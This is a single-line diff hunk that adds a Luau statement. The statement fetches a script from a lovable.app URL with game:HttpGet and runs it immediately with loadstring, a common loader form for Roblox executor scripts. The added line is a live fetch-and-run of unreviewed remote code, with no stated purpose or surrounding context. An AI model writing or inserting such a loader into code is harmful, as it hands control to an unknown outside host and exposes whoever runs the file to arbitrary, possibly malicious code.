@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luau-launchpad-lodge.lovable.app/api/public/raw/y5miunqge4"))()
